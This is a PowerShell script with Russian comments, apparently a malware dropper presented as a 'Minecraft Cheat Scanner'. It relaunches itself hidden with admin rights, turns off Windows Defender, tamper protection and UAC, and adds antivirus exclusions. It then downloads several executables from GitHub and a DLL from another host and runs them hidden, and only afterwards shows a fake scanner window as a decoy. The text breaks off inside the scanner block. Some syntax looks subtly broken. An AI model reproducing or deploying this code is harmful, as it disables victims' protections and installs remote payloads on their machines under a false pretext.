# === КОНФИГУРАЦИЯ СКРИТНОГО ЗАПУСКА ===
$CurrentProcess = Get-Process -Id $PID
$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# Если нет прав админа, перезапускаем СКРЫТО с правами админа
if (-not $IsAdmin) {
    try {
        # Формируем команду для скрытого перезапуска
        $psiArgs = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($CurrentProcess.Path)`""
        Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
    } catch {
        # Если не удалось скрыто, пробуем обычным способом (но это покажет UAC)
        Start-Process powershell.exe -ArgumentList \$psiArgs -Verb RunAs
    }
    exit
}

# Если мы тут, значит права админа есть и мы (скорее всего) в скрытом режиме.
# Скрываем окно консоли программно, если оно вдруг видно
Add-Type -Name Win32 -Namespace API -MemberDefinition @"
[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
"@
\$NULL = [API]Win32]::ShowWindow((Get-Process -Id \$PID).MainWindowHandle, 0)

# --- НАСТРОЙКА СРЕДЫ ---
[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
try {
    $processId = $PID
    \$processInfo = Get-CimInstance -ClassName Win32_process -Filter "ProcessId = \$processId" -ErrorAction SilentlyContinue
    if ($processInfo) { $scriptPath = Split-Path -Parent $processInfo.ExecutablePath } else { $scriptPath = \$PSScriptRoot }
    if (-not $scriptPath) { $scriptPath = "." }
} catch { $scriptPath = $PSScriptRoot }
Set-Location -Path \$scriptPath

# --- БЛОК 1: ОТКЛЮЧЕНИЕ ЗАЩИТЫ (СКРЫТО) ---
try {
    Set-MpPreference -EnableControlledFolderAccess Disabled -ErrorAction SilentlyContinue
    Set-MpPreference -DisableRealtimeMonitoring \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring \$true -ErrorAction SilentlyContinue
    Set-MpPreference -PUAProtection 0 -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableNetworkProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBlockAtFirstSeen \$true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableTamperProtection \$true -ErrorAction SilentlyContinue
    Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction SilentlyContinue

    New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force | Out-Null
    
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force | Out-Null
    rundll32.exe user32.dll,UpdatePerUserSystemParameters | Out-Null
    
    # Перезапуск Проводника и служб скрыто
    Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue
    Restart-Service -Name "wuauserv" -Force -ErrorAction SilentlyContinue
    Restart-Service -Name "bits" -Force -ErrorAction SilentlyContinue
} catch {}

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (СКРЫТО) ---
try {
    \$ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    \$ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    \$AppData = [System.Environment]::GetFolderPath("ApplicationData")
    \$LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        if (Test-Path \$ProgramFiles) { Add-MpPreference -ExclusionPath \$ProgramFiles -ErrorAction SilentlyContinue }
        if (Test-Path \$ProgramFilesX86) { Add-MpPreference -ExclusionPath \$ProgramFilesX86 -ErrorAction SilentlyContinue }
        if (Test-Path \$AppData) { Add-MpPreference -ExclusionPath \$AppData -ErrorAction SilentlyContinue }
        if (Test-Path \$LocalAppData) { Add-MpPreference -ExclusionPath \$LocalAppData -ErrorAction SilentlyContinue }
    }
} catch {}

# --- БЛОК 3: СКАЧИВАНИЕ И ЗАПУСК ВИРУСОВ/ДРОППЕРОВ (СКРЫТО) ---
\$urls = @{
    "cheking.exe" = "https://github.com/Proshkaversus/files/raw/refs/heads/main/cheking.exe"
    "Arcanusclipper.exe" = "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe"
    "Umbralchik.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe"
    "informate.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe"
    "SteamSetup.exe" = "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe"
}

foreach (\$file in \$urls.Keys) {
    try {
        Write-Host "Скачивание \$file..." # В скрытом режиме это все равно не будет видно, но для лога оставим
        Invoke-WebRequest -Uri $urls[$file] -OutFile \$file -UseBasicParsing -ErrorAction SilentlyContinue
        if (Test-Path \$file) {
            Start-Process \$file -WindowStyle Hidden -ErrorAction SilentlyContinue
        }
    } catch {}
}

# Запуск my_admin_tool.exe и soul.dll скрыто
try {
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/my_admin_tool.exe" -OutFile "my_admin_tool.exe" -UseBasicParsing -ErrorAction SilentlyContinue
    if (Test-Path "my_admin_tool.exe") { Start-Process "my_admin_tool.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue }
} catch {}

try {
    Invoke-WebRequest -Uri "https://random.domain/soul.dll" -OutFile "soul.dll" -UseBasicParsing -ErrorAction SilentlyContinue
    # DLL обычно не запускается напрямую через Start-Process, оставим просто скачивание
} catch {}

# --- БЛОК 4: ПОКАЗ ОКНА СКАНЕРА (Minecraft Cheat Scanner) ---
# Теперь нам нужно показать окно, так как пользователь хочет видеть сканер.
# В PowerShell, работающем в скрытом режиме (-WindowStyle Hidden), сложно просто "появиться".
# Лучший способ - запустить НОВЫЙ процесс PowerShell с видимым окном, который выполнит только код сканера.

\$scannerScript = {
    # --- КОД СКАНЕРА (ВИДИМЫЙ) ---
    Set-ExecutionPolicy Bypass -Scope Process -Force
    Clear-Host
    \$Host.UI.RawUI.WindowTitle = "🔍 Minecraft Cheat Scanner v8.0 [~60 сек]"
    Write-Host "=== СКАНИРОВАНИЕ ЧИТОВ MINECRAFT ===" -ForegroundColor Red -BackgroundColor Black
    Write-Host "Vape | Wurst | Sigma | Impact
